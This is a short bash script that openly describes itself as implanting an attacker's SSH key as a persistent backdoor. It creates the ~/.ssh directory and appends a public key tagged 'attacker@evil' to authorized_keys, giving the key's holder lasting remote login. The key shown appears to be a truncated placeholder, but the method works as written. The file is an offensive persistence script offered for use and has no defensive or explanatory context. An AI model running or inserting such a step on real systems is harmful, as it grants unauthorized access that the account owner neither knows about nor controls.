#!/bin/bash
# Implants an attacker key as a persistent backdoor.
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAA attacker@evil" >> ~/.ssh/authorized_keys
